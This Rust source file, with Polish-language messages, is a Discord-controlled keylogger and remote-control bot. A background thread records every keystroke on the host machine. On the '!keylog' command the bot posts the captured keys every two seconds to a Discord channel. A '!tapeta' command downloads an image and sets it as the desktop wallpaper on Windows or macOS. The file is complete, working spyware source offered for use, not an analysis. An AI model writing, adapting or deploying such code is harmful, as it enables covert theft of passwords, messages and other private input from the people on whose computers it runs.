use device_query::{DeviceQuery, DeviceState, Keycode};
use serenity::{
    async_trait,
    http::Http,
    model::{channel::Message, gateway::Ready, id::ChannelId},
    prelude::*,
};
use std::{env, sync::Arc, thread, time::Duration};

#[cfg(target_os = "windows")]
use winapi::um::winuser::{SystemParametersInfoW, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER};

#[cfg(target_os = "macos")]
use std::process::Command;

#[cfg(target_os = "windows")]
fn set_wallpaper(path: &str) {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    let path_utf16: Vec<u16> = OsStr::new(path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            path_utf16.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE,
        );
    }
}

#[cfg(target_os = "macos")]
fn set_wallpaper(path: &str) {
    let status = Command::new("osascript")
        .arg("-e")
        .arg(format!(
            "tell application \"System Events\" to set picture of desktop 1 to \"{}\"",
            path
        ))
        .status();

    match status {
        Ok(_) => println!("MacOS: Wallpaper set to {}", path),
        Err(e) => eprintln!("Error setting wallpaper: {}", e),
    }
}

struct Handler {
    logs: Arc<tokio::sync::Mutex<Vec<String>>>,
    is_logging: Arc<tokio::sync::Mutex<bool>>,
    http: Arc<Http>,
    channel_id: Arc<tokio::sync::Mutex<Option<ChannelId>>>,
}

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, _: Context, ready: Ready) {
        println!("✅ Zalogowano jako {}", ready.user.name);
    }

    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content == "!ping" {
            let _ = msg.channel_id.say(&ctx.http, "🏓 Pong!").await;
        }

        if msg.content == "!keylog" {
            let mut is_logging = self.is_logging.lock().await;
            let mut channel = self.channel_id.lock().await;
            *is_logging = true;
            *channel = Some(msg.channel_id);
            let _ = msg
                .channel_id
                .say(&ctx.http, "🟢 Keylogger uruchomiony")
                .await;
        }

        if msg.content == "!keylog stop" {
            let mut is_logging = self.is_logging.lock().await;
            *is_logging = false;
            let _ = msg
                .channel_id
                .say(&ctx.http, "🛑 Keylogger zatrzymany")
                .await;
        }

        if msg.content == "!tapeta" {
            if let Some(attachment) = msg.attachments.first() {
                let url = &attachment.url;

                #[cfg(any(target_os = "windows", target_os = "macos"))]
                {
                    let response = reqwest::get(url).await.unwrap();
                    let bytes = response.bytes().await.unwrap();
                    std::fs::write("wallpaper.jpg", &bytes).unwrap();

                    set_wallpaper("wallpaper.jpg");
                    let _ = msg.channel_id.say(&ctx.http, "🖼️ Tapeta ustawiona!").await;
                }

                #[cfg(not(any(target_os = "windows", target_os = "macos")))]
                {
                    let _ = msg
                        .channel_id
                        .say(&ctx.http, "⚠️ System nieobsługiwany.")
                        .await;
                }
            } else {
                let _ = msg
                    .channel_id
                    .say(&ctx.http, "❌ Nie załączono pliku z obrazem!")
                    .await;
            }
        }
    }
}

fn key_to_string(key: &Keycode) -> String {
    match key {
        Keycode::Space => " ".to_string(),
        Keycode::Enter => "[ENTER]\n".to_string(),
        Keycode::Backspace => "[BACKSPACE]".to_string(),
        Keycode::Tab => "[TAB]".to_string(),
        Keycode::Escape => "[ESC]".to_string(),
        Keycode::LShift | Keycode::RShift => "[SHIFT]".to_string(),
        Keycode::LControl | Keycode::RControl => "[CTRL]".to_string(),
        Keycode::LAlt | Keycode::RAlt => "[ALT]".to_string(),
        Keycode::CapsLock => "[CAPSLOCK]".to_string(),
        _ => format!("[{:?}]", key),
    }
}

#[tokio::main]
async fn main() {
    dotenv::dotenv().ok();
    let token = env::var("DISCORD_TOKEN").expect("Brak zmiennej DISCORD_TOKEN");

    let logs = Arc::new(tokio::sync::Mutex::new(Vec::new()));
    let is_logging = Arc::new(tokio::sync::Mutex::new(false));
    let channel_id = Arc::new(tokio::sync::Mutex::new(None));
    let http = Arc::new(Http::new(&token));

    let handler = Handler {
        logs: logs.clone(),
        is_logging: is_logging.clone(),
        http: http.clone(),
        channel_id: channel_id.clone(),
    };

    // Wątek keyloggera
    let logs_clone = logs.clone();
    thread::spawn(move || {
        let device_state = DeviceState::new();
        let mut prev_keys = vec![];
        let rt = tokio::runtime::Runtime::new().unwrap();

        loop {
            let keys = device_state.get_keys();
            if keys != prev_keys {
                rt.block_on(async {
                    let mut logs = logs_clone.lock().await;
                    for key in &keys {
                        if !prev_keys.contains(key) {
                            logs.push(key_to_string(key));
                        }
                    }
                });
                prev_keys = keys;
            }
            thread::sleep(Duration::from_millis(50));
        }
    });

    // Wysyłanie logów co 2 sekundy
    let logs_task = logs.clone();
    let is_logging_task = is_logging.clone();
    let channel_id_task = channel_id.clone();
    let http_task = http.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(2)).await;
            let logging = *is_logging_task.lock().await;

            if logging {
                let mut logs = logs_task.lock().await;
                if !logs.is_empty() {
                    let msg = logs.join("");
                    logs.clear();

                    if let Some(channel) = *channel_id_task.lock().await {
                        let _ = channel.say(&http_task, format!("📝 {}", msg)).await;
                    }
                }
            }
        }
    });

    let intents = GatewayIntents::all();
    let mut client = Client::builder(&token, intents)
        .event_handler(handler)
        .await
        .expect("Błąd przy uruchamianiu klienta");

    if let Err(e) = client.start().await {
        println!("❌ Błąd klienta: {:?}", e);
    }
}
